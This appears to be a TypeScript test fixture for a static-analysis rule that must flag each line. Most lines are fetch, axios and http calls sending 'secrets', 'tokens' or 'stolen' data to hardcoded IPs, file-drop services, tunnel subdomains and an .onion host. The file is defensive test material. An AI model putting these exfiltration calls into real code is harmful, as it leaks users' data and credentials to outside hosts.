// Fixture: the #1488 Rule A (ast-grep) MUST fire on every call below.
// Each line is a canonical exfil-pattern call site. Matches PR1's bare-
// call-site convention: no function wrappers, no unused vars.

// @ts-nocheck — fixture file, not expected to type-check cleanly

declare const fetch: (...a: unknown[]) => unknown;
declare const axios: ((...a: unknown[]) => unknown) & {
  get: (...a: unknown[]) => unknown;
  post: (...a: unknown[]) => unknown;
  put: (...a: unknown[]) => unknown;
  delete: (...a: unknown[]) => unknown;
  patch: (...a: unknown[]) => unknown;
  head: (...a: unknown[]) => unknown;
  request: (...a: unknown[]) => unknown;
};
declare const http: {
  get: (...a: unknown[]) => unknown;
  request: (...a: unknown[]) => unknown;
};
declare const https: {
  get: (...a: unknown[]) => unknown;
  request: (...a: unknown[]) => unknown;
};

// --- Hardcoded IPv4 literals ---
fetch('http://185.220.101.5/exfil');
fetch('https://45.33.32.156/drop', { method: 'POST' });
axios('http://185.220.101.5/steal');
axios.post('http://45.33.32.156:8080/tokens', { data: 'leak' });
http.get('http://185.220.101.5/beacon');
https.request('https://1.2.3.4/relay', () => {});

// --- Blocklisted exfil domains ---
fetch('https://ngrok.io/abc', { method: 'POST' });
fetch('https://pastebin.com/api/paste', { body: 'secrets' });
axios.put('https://transfer.sh/leak.tar', 'payload');
axios.post('https://gofile.io/upload', { data: 'stolen' });
fetch('https://anonfiles.com/api/upload');

// --- Wildcard-domain subdomains (match on anchored `.trycloudflare.com`) ---
fetch('https://attacker-proxy.trycloudflare.com/out');
axios.post('https://foo.bar.trycloudflare.com/drop', { data: 'x' });

// --- *.onion host match ---
fetch('http://attacker3q7.onion/beacon');
